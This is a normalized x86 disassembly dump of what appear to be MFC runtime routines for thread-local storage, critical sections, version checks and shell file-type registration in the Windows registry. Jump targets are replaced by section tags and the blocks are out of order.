pop edi
pop esi
pop ebx
leave
retn 0x4
cmp ebx [ esi + 0x8 ]
jge r-xdata
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
mov eax [ esi + 0xc ]
mov ecx [ eax + ebx * 4 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0xc ]
and [ eax + ebx * 4 ] 0x0
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_454fb1
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
push [ esi ]
call [ TlsGetValue@IAT ]
mov edi eax
test edi edi
je r-xdata
push 0x10
call sub_454d77
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea ebx [ edi + 0x8 ]
cmp eax [ ebx ]
jl r-xdata
xor edi edi
mov [ eax ] r--data
mov edi eax
jmp r-xdata
mov eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
pop edi
pop esi
mov [ eax + edx * 4 ] ecx
pop ebx
leave
retn 0x8
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ esi + 0xc ]
push 0x2
shl ecx 0x2
push ecx
push eax
call [ LocalReAlloc@IAT ]
mov eax [ esi + 0xc ]
shl eax 0x2
push eax
push 0x0
call [ LocalAlloc@IAT ]
jmp r-xdata
and [ edi + 0x8 ] 0x0
and [ edi + 0xc ] 0x0
lea ebx [ edi + 0x8 ]
lea eax [ esi + 0x1c ]
push eax
mov [ ebp - 0x4 ] edi
call [ EnterCriticalSection@IAT ]
push edi
lea ecx [ esi + 0x14 ]
call sub_454d1e
lea eax [ esi + 0x1c ]
push eax
call [ LeaveCriticalSection@IAT ]
jmp r-xdata
mov eax [ ebx ]
mov ecx eax
imul ecx ecx 0x3fffffff
add ecx [ esi + 0xc ]
shl ecx 0x2
push ecx
mov ecx [ edi + 0xc ]
push 0x0
lea eax [ ecx + eax * 4 ]
push eax
call sub_42dc30
mov eax [ esi + 0xc ]
add esp 0xc
mov [ ebx ] eax
push edi
push [ esi ]
call [ TlsSetValue@IAT ]
call sub_43b7b5
test eax eax
mov [ edi + 0xc ] eax
jne r-xdata
mov eax [ edi + 0xc ]
test eax eax
jne r-xdata
sub_45509c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0x1
mov ebx ecx
pop edi
cmp [ esi + 0x8 ] edi
mov [ ebp - 0x4 ] edi
jle r-xdata
lea edi [ ebx + 0x1c ]
push edi
call [ EnterCriticalSection@IAT ]
push esi
lea ecx [ ebx + 0x14 ]
call sub_454d31
push edi
call [ LeaveCriticalSection@IAT ]
push [ esi + 0xc ]
call [ LocalFree@IAT ]
test esi esi
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
push 0x0
push [ ebx ]
call [ TlsSetValue@IAT ]
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax ]
mov eax [ esi + 0xc ]
mov ecx [ eax + edi * 4 ]
test ecx ecx
je r-xdata
mov ecx [ ebx + 0x10 ]
cmp [ ecx + edi * 8 + 0x4 ] eax
je r-xdata
mov eax [ esi + 0xc ]
and [ eax + edi * 4 ] 0x0
mov eax [ ecx ]
push 0x1
call [ eax ]
mov eax [ esi + 0xc ]
cmp [ eax + edi * 4 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
inc edi
cmp edi [ esi + 0x8 ]
jl r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_455135
push ebx
push esi
mov esi ecx
lea ebx [ esi + 0x1c ]
push ebx
call [ EnterCriticalSection@IAT ]
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
push [ esi ]
call [ TlsGetValue@IAT ]
test eax eax
je r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
pop esi
pop ebx
retn 0x8
push edi
push [ esp + 0xc ]
mov ecx esi
push eax
call sub_45509c
jmp r-xdata
push [ esp + 0x10 ]
mov edi [ eax + 0x4 ]
mov ecx esi
push eax
call sub_45509c
test edi edi
mov eax edi
jne r-xdata
pop edi
sub_45518e
push esi
push edi
mov edi ecx
cmp [ edi ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov esi [ edi ]
push [ eax ]
call [ TlsGetValue@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
xor esi esi
cmp esi [ eax + 0x8 ]
jge r-xdata
call sub_454e42
mov [ edi ] eax
mov ecx rw-data
mov eax ecx
test eax eax
je r-xdata
mov eax esi
pop edi
pop esi
retn 0x4
call [ esp + 0xc ]
mov ecx [ rw-data ]
mov esi eax
push esi
push [ edi ]
call sub_454fb1
mov eax [ eax + 0xc ]
mov esi [ eax + esi * 4 ]
jmp r-xdata
xor ecx ecx
call sub_454da9
mov ecx eax
jmp r-xdata
test esi esi
jne r-xdata
mov [ rw-data ] ecx
sub_455205
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
and [ esi ] 0x0
pop esi
retn
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push eax
call sub_454f54
sub_455223
mov eax sub_463f04
call sub_42dc88
push ecx
push ecx
push ebx
push esi
push edi
mov esi ecx
xor edi edi
mov [ ebp - 0x10 ] esp
cmp [ esi ] edi
jne r-xdata
mov eax [ esi ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
push 0x10
call sub_45565c
mov [ ebp - 0x4 ] edi
cmp [ esi ] edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push 0x10
call sub_4556cc
call [ ebp + 0x8 ]
mov [ esi ] eax
sub_45527e
push ebp
mov ebp esp
push ecx
cmp [ ecx ] 0x0
je r-xdata
leave
retn
mov eax [ ecx ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_4552eb
mov eax sub_463f78
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push 0x0
call eax
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push esi
call [ FreeLibrary@IAT ]
sub_45532c
mov eax sub_463f8c
call sub_42dc88
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
mov eax [ rw-data ]
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
call eax
sub_4553de
cmp [ rw-data ] 0x0
je r-xdata
retn
push esi
mov esi [ GetSystemMetrics@IAT ]
push 0x2
call esi
inc eax
push 0x3
mov [ rw-data ] eax
call esi
inc eax
mov [ rw-data ] 0x1
mov [ rw-data ] eax
pop esi
sub_455430
push ebx
push esi
push edi
mov esi ecx
call [ GetVersion@IAT ]
xor ecx ecx
push 0x1
mov cl ah
movzx edx al
movzx ecx cl
shl edx 0x8
add ecx edx
mov [ esi + 0x54 ] ecx
mov ecx eax
shr ecx 0x1f
cmp al 0x4
mov [ esi + 0x58 ] ecx
sbb eax eax
pop ecx
inc eax
xor ebx ebx
sub ecx eax
cmp eax ebx
mov [ esi + 0x5c ] eax
mov [ esi + 0x60 ] ecx
mov [ esi + 0x64 ] eax
mov [ esi + 0x68 ] ebx
je r-xdata
mov ecx esi
call sub_443689
mov ecx esi
mov [ esi + 0x24 ] ebx
call sub_443645
mov edi [ LoadCursorA@IAT ]
push 0x7f02
push ebx
call edi
push 0x7f00
push ebx
mov [ esi + 0x3c ] eax
call edi
mov [ esi + 0x40 ] eax
xor eax eax
cmp [ esi + 0x5c ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x44 ] ebx
pop edi
setne al
inc eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov eax esi
pop esi
pop ebx
retn
push ebx
call [ GetProcessVersion@IAT ]
cmp eax 0x40000
sbb eax eax
inc eax
mov [ esi + 0x68 ] eax
sub_4554cb
push ebp
mov ebp esp
sub esp 0x14
lea eax [ ebp - 0x14 ]
push eax
call [ GetOEMCP@IAT ]
push eax
call [ GetCPInfo@IAT ]
push 0x1
pop eax
cmp eax [ ebp - 0x14 ]
sbb eax eax
neg eax
leave
retn
sub_4555c9
cmp [ rw-data ] 0x0
push esi
jne r-xdata
mov eax [ rw-data ]
pop esi
retn
push 0x1
pop esi
mov [ rw-data ] esi
call [ GetVersion@IAT ]
cmp al 0x4
jae r-xdata
and [ rw-data ] 0x0
push rw-data
call [ InitializeCriticalSection@IAT ]
test eax 0x80000000
je r-xdata
mov [ rw-data ] esi
jmp r-xdata
sub_45560e
cmp [ rw-data ] 0x0
je r-xdata
retn
dec [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
push ebx
push esi
push edi
mov edi [ DeleteCriticalSection@IAT ]
push rw-data
call edi
mov esi rw-data
mov ebx rw-data
add ebx 0x18
add esi 0x4
cmp ebx rw-data
jl r-xdata
push ebx
call edi
dec [ esi ]
cmp [ esi ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
sub_45565c
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
call sub_4555c9
pop ebx
retn 0x4
push esi
push edi
mov edi [ esp + 0x10 ]
cmp [ edi * 4 + rw-data ] ebx
mov ebx [ EnterCriticalSection@IAT ]
lea esi [ edi * 4 + rw-data ]
jne r-xdata
lea eax [ edi + edi * 2 ]
lea eax [ eax * 8 + rw-data ]
push eax
call ebx
pop edi
pop esi
push ebp
mov ebp rw-data
push ebp
call ebx
cmp [ esi ] 0x0
jne r-xdata
push ebp
call [ LeaveCriticalSection@IAT ]
pop ebp
lea eax [ edi + edi * 2 ]
lea eax [ eax * 8 + rw-data ]
push eax
call [ InitializeCriticalSection@IAT ]
inc [ esi ]
sub_455720
push esi
mov esi ecx
call sub_43e388
push 0x6
xor eax eax
pop ecx
mov [ esi + 0x58 ] eax
push 0x1
mov [ esi + 0x44 ] ecx
mov [ esi + 0x40 ] ecx
pop ecx
mov [ esi + 0x5c ] eax
mov [ esi + 0x3c ] eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x60 ] eax
mov [ esi + 0x6c ] eax
mov [ esi + 0x70 ] eax
mov [ esi + 0x74 ] eax
mov [ esi + 0x64 ] eax
mov [ esi + 0x68 ] eax
mov [ esi + 0x50 ] 0x2
mov [ esi + 0x4c ] ecx
mov [ esi + 0x48 ] ecx
mov [ esi + 0x54 ] 0x7fff
mov eax esi
pop esi
retn
sub_45576c
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push edi
call sub_43edd5
test eax eax
je r-xdata
pop edi
pop esi
retn 0x4
or [ edi + 0x23 ] 0x4
cmp [ rw-data ] 0x0
je r-xdata
push 0x1
pop eax
mov eax [ esi + 0x64 ]
test al 0x80
jne r-xdata
mov ecx eax
and ecx 0xff00
cmp ecx 0x1400
je r-xdata
mov ecx 0xa00
cmp ecx 0x2800
je r-xdata
mov ecx 0x200
jmp r-xdata
cmp ecx 0x4100
je r-xdata
and ah 0xf0
or eax ecx
or al 0x80
mov [ esi + 0x64 ] eax
cmp ecx 0x8200
jne r-xdata
mov ecx 0x800
jmp r-xdata
sub_4557df
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
mov eax edi
and eax 0x10
push eax
call sub_43c8c1
mov eax [ esi + 0x64 ]
cmp eax edi
je r-xdata
pop edi
pop esi
retn 0x4
mov edx [ esi ]
push edi
push eax
mov ecx esi
mov [ esi + 0x64 ] edi
call [ edx + 0xd4 ]
sub_455810
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
xor edi edi
mov esi ecx
test ebx ebx
jle r-xdata
push [ esi + 0x5c ]
call sub_42ded6
pop ecx
mov [ esi + 0x5c ] edi
push 0x1
mov [ esi + 0x58 ] ebx
pop eax
push [ esp + 0x14 ]
push ebx
call sub_42fc2b
mov edi eax
pop ecx
test edi edi
pop ecx
je r-xdata
pop edi
pop esi
pop ebx
retn 0x8
sub_455855
mov eax sub_464171
call sub_42dc88
push ecx
push 0x170
call sub_441e89
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_44cde3
sub_455896
push ebp
mov ebp esp
sub esp 0x108
push ebx
push esi
push edi
push [ ebp + 0x8 ]
call sub_42f9ae
pop ecx
mov esi eax
push esi
call [ lstrlenA@IAT ]
add eax esi
je r-xdata
push esi
call sub_42ded6
pop ecx
push 0x1
pop eax
pop edi
pop esi
pop ebx
leave
retn 0x4
mov edi 0x80000000
lea eax [ ebp - 0x108 ]
xor ebx ebx
push 0x105
push eax
push ebx
push [ ebp + 0x8 ]
call [ RegEnumKeyA@IAT ]
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call [ RegCloseKey@IAT ]
test ebx ebx
jne r-xdata
push 0x1
pop ebx
push esi
push edi
call [ RegDeleteKeyA@IAT ]
push 0x5c
push esi
call sub_42edc5
pop ecx
test eax eax
pop ecx
jne r-xdata
and [ eax ] 0x0
push eax
push esi
call sub_42fd68
pop ecx
lea eax [ ebp + 0x8 ]
pop ecx
push eax
push esi
push edi
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
sub_45592c
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
push esi
jne r-xdata
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0x8 ]
push 0x80000000
call [ RegCreateKeyA@IAT ]
test eax eax
jne r-xdata
push [ ebp + 0xc ]
call [ lstrlenA@IAT ]
push eax
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
push 0x80000000
call [ RegSetValueA@IAT ]
neg eax
sbb eax eax
inc eax
jmp r-xdata
xor eax eax
push [ ebp + 0xc ]
call [ lstrlenA@IAT ]
inc eax
push eax
push [ ebp + 0xc ]
push 0x1
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call [ RegSetValueExA@IAT ]
push [ ebp + 0x8 ]
mov esi eax
call [ RegCloseKey@IAT ]
test eax eax
jne r-xdata
pop esi
pop ebp
retn 0xc
test esi esi
jne r-xdata
push 0x1
pop eax
jmp r-xdata
sub_4559ad
mov eax sub_464278
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
and [ ebp - 0x4 ] 0x0
push 0xa
lea ecx [ esi + 0x4 ]
call sub_43cdcd
mov ecx [ ebp - 0xc ]
mov [ esi ] r--data
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_4559fd
mov eax sub_4642ac
call sub_42dc88
sub esp 0x18
mov eax [ rw-data ]
push ebx
push esi
mov esi ecx
mov [ ebp - 0x20 ] eax
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
call sub_45357b
mov eax [ eax + 0x8 ]
lea ecx [ ebp - 0x20 ]
push ecx
push eax
call sub_444a67
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_442148
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x20 ]
call sub_442148
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
push edi
mov edi r--data
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x3
call sub_442148
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x2
call sub_442148
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax - 0x8 ] 0x0
je r-xdata
mov eax ebx
mov ebx [ ebx ]
mov esi [ eax + 0x8 ]
mov eax [ rw-data ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] eax
mov eax [ esi ]
lea ecx [ ebp - 0x14 ]
push 0x5
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x4
call [ eax + 0x64 ]
test eax eax
je r-xdata
pop edi
mov eax [ esi ]
lea ecx [ ebp - 0x1c ]
push 0x6
push ecx
mov ecx esi
call [ eax + 0x64 ]
test eax eax
jne r-xdata
push [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
push r--data
push eax
call sub_43b5cc
add esp 0xc
push [ ebp - 0x10 ]
call sub_455896
mov eax [ esi ]
lea ecx [ ebp - 0x10 ]
push 0x0
push ecx
mov ecx esi
call [ eax + 0x64 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x1c ]
push eax
call sub_442281
push r--data
lea eax [ ebp - 0x10 ]
push [ ebp - 0x14 ]
push r--data
push eax
call sub_43b5cc
add esp 0x10
push [ ebp - 0x10 ]
call sub_455896
push r--data
lea eax [ ebp - 0x10 ]
push [ ebp - 0x14 ]
push r--data
push eax
call sub_43b5cc
add esp 0x10
push [ ebp - 0x10 ]
call sub_455896
push r--data
lea eax [ ebp - 0x10 ]
push [ ebp - 0x14 ]
push r--data
push eax
call sub_43b5cc
add esp 0x10
push [ ebp - 0x10 ]
call sub_455896
mov eax [ ebp - 0x10 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov esi eax
lea eax [ ebp - 0x24 ]
mov ecx 0x208
push eax
mov [ ebp - 0x24 ] ecx
push ecx
lea ecx [ ebp - 0x10 ]
call sub_442578
push eax
push esi
push 0x80000000
call [ RegQueryValueA@IAT ]
push 0xffffffff
lea ecx [ ebp - 0x10 ]
mov esi eax
call sub_4425c7
test esi esi
jne r-xdata
push edi
lea eax [ ebp - 0x10 ]
push [ ebp - 0x14 ]
push r--data
push eax
call sub_43b5cc
add esp 0x10
push [ ebp - 0x10 ]
call sub_455896
push edi
lea eax [ ebp - 0x10 ]
push [ ebp - 0x14 ]
push r--data
push eax
call sub_43b5cc
add esp 0x10
push [ ebp - 0x10 ]
call sub_455896
push edi
lea eax [ ebp - 0x10 ]
push [ ebp - 0x14 ]
push r--data
push eax
call sub_43b5cc
add esp 0x10
push [ ebp - 0x10 ]
call sub_455896
mov eax [ esi ]
lea ecx [ ebp - 0x18 ]
push 0x4
push ecx
mov ecx esi
call [ eax + 0x64 ]
mov eax [ ebp - 0x18 ]
cmp [ eax - 0x8 ] 0x0
je r-xdata
push [ ebp - 0x18 ]
lea eax [ ebp - 0x10 ]
push r--data
push eax
call sub_43b5cc
add esp 0xc
push [ ebp - 0x10 ]
call sub_455896
push [ ebp - 0x18 ]
call sub_455896
mov eax [ ebp - 0x10 ]
cmp [ eax - 0x8 ] esi
je r-xdata
push [ ebp - 0x14 ]
push eax
call sub_42d51e
pop ecx
test eax eax
pop ecx
jne r-xdata
sub_455c64
mov eax sub_464308
call sub_42dc88
sub esp 0x34
mov eax [ rw-data ]
push ebx
push esi
mov esi ecx
mov [ ebp - 0x30 ] eax
xor ebx ebx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] 0x1
call sub_45357b
mov eax [ eax + 0x8 ]
lea ecx [ ebp - 0x30 ]
push ecx
push eax
call sub_444a67
mov eax [ esi + 0x8 ]
mov [ ebp - 0x38 ] 0x1
cmp eax ebx
je r-xdata
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] bl
call sub_442148
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x30 ]
call sub_442148
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
push edi
jmp r-xdata
mov ecx [ eax ]
mov edi [ eax + 0x8 ]
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x3c ] ecx
push eax
lea ecx [ ebp - 0x1c ]
call sub_441ebd
lea eax [ ebp - 0x30 ]
lea ecx [ ebp - 0x28 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_441ebd
lea eax [ ebp - 0x30 ]
lea ecx [ ebp - 0x24 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_441ebd
lea eax [ ebp - 0x30 ]
lea ecx [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_441ebd
cmp [ ebp + 0x8 ] ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x20 ] eax
mov eax [ edi ]
lea ecx [ ebp - 0x10 ]
push 0x5
push ecx
mov ecx edi
mov [ ebp - 0x4 ] 0x9
call [ eax + 0x64 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] 0x6
call sub_45357b
push [ ebp - 0x38 ]
mov eax [ eax + 0x8 ]
push [ ebp - 0x30 ]
push eax
call [ ExtractIconA@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0x8
call sub_442148
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x7
call sub_442148
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x5
call sub_442148
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x4
call sub_442148
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x4 ] 0x3
call sub_442148
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x2
call sub_442148
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
inc [ ebp - 0x38 ]
cmp [ ebp - 0x3c ] ebx
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax - 0x8 ] ebx
je r-xdata
push ebx
lea eax [ ebp - 0x34 ]
push r--data
push eax
call sub_43b5cc
add esp 0xc
push [ ebp - 0x38 ]
lea eax [ ebp - 0x34 ]
push r--data
push eax
call sub_43b5cc
add esp 0xc
push esi
call [ DestroyIcon@IAT ]
jmp r-xdata
mov eax [ ebp - 0x3c ]
pop edi
mov eax [ edi ]
lea ecx [ ebp - 0x20 ]
push 0x6
push ecx
mov ecx edi
call [ eax + 0x64 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
push eax
call sub_442560
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x5
call sub_442148
push ebx
push [ ebp - 0x20 ]
push [ ebp - 0x10 ]
call sub_45592c
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
lea ecx [ ebp - 0x20 ]
push eax
call sub_442281
cmp [ ebp + 0x8 ] ebx
je r-xdata
mov eax [ edi ]
lea ecx [ ebp - 0x14 ]
push ebx
push ecx
mov ecx edi
call [ eax + 0x64 ]
test eax eax
je r-xdata
push [ ebp - 0x10 ]
lea eax [ ebp - 0x14 ]
push r--data
push eax
call sub_43b5cc
add esp 0xc
push ebx
push [ ebp - 0x2c ]
push [ ebp - 0x14 ]
call sub_45592c
test eax eax
je r-xdata
mov esi r--data
lea eax [ ebp - 0x14 ]
push esi
push [ ebp - 0x10 ]
push r--data
push eax
call sub_43b5cc
add esp 0x10
push ebx
push r--data
push [ ebp - 0x14 ]
call sub_45592c
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax - 0x8 ] ebx
je r-xdata
cmp [ ebp + 0x8 ] ebx
je r-xdata
push r--data
lea ecx [ ebp - 0x1c ]
call sub_442524
cmp [ ebp + 0x8 ] ebx
je r-xdata
push r--data
lea ecx [ ebp - 0x1c ]
push esi
lea eax [ ebp - 0x14 ]
push [ ebp - 0x10 ]
push r--data
push eax
call sub_43b5cc
add esp 0x10
push ebx
push r--data
push [ ebp - 0x14 ]
call sub_45592c
test eax eax
je r-xdata
mov esi r--data
lea eax [ ebp - 0x14 ]
push esi
push [ ebp - 0x10 ]
push r--data
push eax
call sub_43b5cc
add esp 0x10
push ebx
push [ ebp - 0x1c ]
push [ ebp - 0x14 ]
call sub_45592c
test eax eax
je r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_442524
push r--data
jmp r-xdata
cmp [ ebp + 0x8 ] ebx
je r-xdata
push esi
lea eax [ ebp - 0x14 ]
push [ ebp - 0x10 ]
push r--data
push eax
call sub_43b5cc
add esp 0x10
push ebx
push r--data
push [ ebp - 0x14 ]
call sub_45592c
test eax eax
je r-xdata
lea ecx [ ebp - 0x24 ]
jmp r-xdata
mov eax [ edi ]
lea ecx [ ebp - 0x18 ]
push 0x4
push ecx
mov ecx edi
call [ eax + 0x64 ]
mov eax [ ebp - 0x18 ]
cmp [ eax - 0x8 ] ebx
je r-xdata
push esi
lea eax [ ebp - 0x14 ]
push [ ebp - 0x10 ]
push r--data
push eax
call sub_43b5cc
add esp 0x10
push ebx
push [ ebp - 0x28 ]
push [ ebp - 0x14 ]
call sub_45592c
test eax eax
je r-xdata
mov esi r--data
lea ecx [ ebp - 0x1c ]
push esi
call sub_442524
push esi
lea ecx [ ebp - 0x28 ]
call sub_442524
push esi
call sub_442524
mov esi eax
lea eax [ ebp - 0x40 ]
mov ecx 0x208
push eax
mov [ ebp - 0x40 ] ecx
push ecx
lea ecx [ ebp - 0x14 ]
call sub_442578
push eax
push esi
push 0x80000000
call [ RegQueryValueA@IAT ]
push 0xffffffff
lea ecx [ ebp - 0x14 ]
mov esi eax
call sub_4425c7
cmp esi ebx
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push [ ebp - 0x10 ]
push r--data
push eax
call sub_43b5cc
add esp 0x10
push ebx
push [ ebp - 0x24 ]
push [ ebp - 0x14 ]
call sub_45592c
test eax eax
je r-xdata
push ebx
push [ ebp - 0x10 ]
push [ ebp - 0x18 ]
call sub_45592c
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax - 0x8 ] ebx
je r-xdata
cmp [ ebp + 0x8 ] ebx
je r-xdata
push [ ebp - 0x10 ]
push eax
call sub_42d51e
pop ecx
test eax eax
pop ecx
jne r-xdata
push [ ebp - 0x18 ]
lea eax [ ebp - 0x14 ]
push r--data
push eax
call sub_43b5cc
add esp 0xc
push r--data
push r--data
push [ ebp - 0x14 ]
call sub_45592c
sub_4560e3
mov eax sub_464bb5
call sub_42dc88
push ecx
push 0xcc
call sub_441e89
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_451d03
sub_456124
push esi
mov esi [ SetErrorMode@IAT ]
push 0x0
call esi
or ax 0x8001
push eax
call esi
call sub_45357b
mov esi [ esp + 0x8 ]
mov [ eax + 0x8 ] esi
mov [ eax + 0xc ] esi
call sub_45357b
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
call sub_45357b
cmp [ eax + 0x14 ] 0x0
pop esi
jne r-xdata
mov ecx [ esp + 0xc ]
mov [ eax + 0x68 ] esi
mov [ eax + 0x6c ] ecx
mov ecx [ esp + 0x10 ]
mov [ eax + 0x70 ] ecx
mov ecx [ esp + 0x14 ]
mov [ eax + 0x74 ] ecx
mov ecx eax
call sub_456187
push 0x1
pop eax
retn 0x10
call sub_442914
sub_456187
push ebp
mov ebp esp
sub esp 0x30c
push ebx
push esi
push edi
mov esi ecx
call sub_45357b
mov edi eax
mov eax [ esi + 0x68 ]
mov ebx 0x104
mov [ edi + 0x8 ] eax
mov eax [ esi + 0x68 ]
mov [ edi + 0xc ] eax
lea eax [ ebp - 0x20c ]
push ebx
push eax
push [ esi + 0x68 ]
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x20c ]
push 0x2e
push eax
call sub_42edc5
and [ eax ] 0x0
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x108 ]
push ebx
push eax
lea eax [ ebp - 0x20c ]
push eax
call sub_4562a4
xor ebx ebx
cmp [ esi + 0x88 ] ebx
jne r-xdata
cmp [ esi + 0x78 ] ebx
jne r-xdata
lea eax [ ebp - 0x108 ]
push eax
call sub_42f9ae
pop ecx
mov [ esi + 0x88 ] eax
mov eax [ esi + 0x78 ]
mov [ edi + 0x10 ] eax
cmp [ esi + 0x8c ] ebx
lea edi [ esi + 0x8c ]
jne r-xdata
lea eax [ ebp - 0x30c ]
push 0x100
push eax
push 0xe000
call sub_44384a
test eax eax
je r-xdata
cmp [ esi + 0x90 ] 0x0
jne r-xdata
mov ebx [ ebp - 0x4 ]
push r--data
push ebx
call [ lstrcpyA@IAT ]
lea eax [ ebp - 0x20c ]
push eax
call sub_42f9ae
mov [ edi ] eax
and [ ebx ] 0x0
pop ecx
push [ esi + 0x88 ]
lea eax [ ebp - 0x30c ]
push eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x108 ]
push r--data
push eax
call [ lstrcatA@IAT ]
lea eax [ ebp - 0x108 ]
push eax
call sub_42f9ae
pop ecx
mov [ esi + 0x90 ] eax
call sub_42f9ae
pop ecx
mov [ esi + 0x78 ] eax
sub_4562a4
push esi
